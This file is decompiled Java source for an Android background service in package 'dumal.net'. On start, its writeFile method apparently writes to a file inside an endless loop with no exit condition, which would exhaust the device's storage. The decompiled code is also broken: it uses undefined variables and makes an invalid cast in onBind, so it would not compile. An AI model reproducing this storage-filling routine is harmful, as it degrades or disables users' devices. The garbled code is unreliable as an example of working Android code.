package dumal.net;

import adrt.ADRTLogCatReader;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class service extends Service {
	public service() {
		super();
		Service r0_Service = this;
		Service r2_Service = r0_Service;
	}

	@Override
	public IBinder onBind(Intent r5_Intent) {
		return (IBinder) false;
	}

	@Override
	public void onCreate() {
		Context r0_Context = this;
		ADRTLogCatReader.onContext(r0_Context, "com.aide.ui");
		super.onCreate();
	}

	@Override
	public void onStart(Intent r8_Intent, int r9i) {
		Service r0_Service = this;
		super.onStart(r8_Intent, r9i);
		r0_Service.writeFile();
	}

	public void writeFile() {
		FileOutputStream r12_FileOutputStream;
		int r6i;
		File r12_File = r8_File;
		StringBuffer r12_StringBuffer = r10_StringBuffer;
		File r2_File = r12_File;
		r12_File = r8_File;
		File r3_File = r12_File;
		try {
			r12_FileOutputStream = r8_FileOutputStream;
			r6i = 0;
			while (true) {
				r12_StringBuffer = r8_StringBuffer;
				r12_FileOutputStream.write(r12_StringBuffer.append("0").append(String.valueOf(r6i)).toString().getBytes());
			}
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
	}
}
